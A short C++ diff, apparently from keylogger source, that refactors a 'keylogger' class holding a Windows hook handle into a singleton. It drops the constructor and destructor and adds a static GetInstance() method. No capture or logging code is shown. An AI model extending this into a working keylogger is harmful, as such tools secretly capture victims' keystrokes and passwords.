@@ -14,9 +14,8 @@
 class keylogger
 {
 public:
-    keylogger();
     
-    ~keylogger();
+    static keylogger& GetInstance();
 
 private:
     HHOOK hook;
